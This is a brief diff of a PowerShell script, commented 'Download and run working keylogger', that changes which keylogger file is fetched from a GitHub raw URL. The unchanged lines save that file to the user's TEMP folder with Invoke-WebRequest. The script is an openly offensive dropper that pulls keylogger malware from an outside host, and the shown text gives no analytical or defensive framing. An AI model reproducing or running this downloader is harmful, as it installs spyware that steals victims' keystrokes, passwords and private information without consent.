@@ -1,5 +1,5 @@
 # Download and run working keylogger
-$pyUrl = "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-fixed.py"
+$pyUrl = "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-working.py"
 $pyFile = "$env:TEMP\kl.py"
 Invoke-WebRequest -Uri $pyUrl -OutFile $pyFile -UseBasicParsing
 
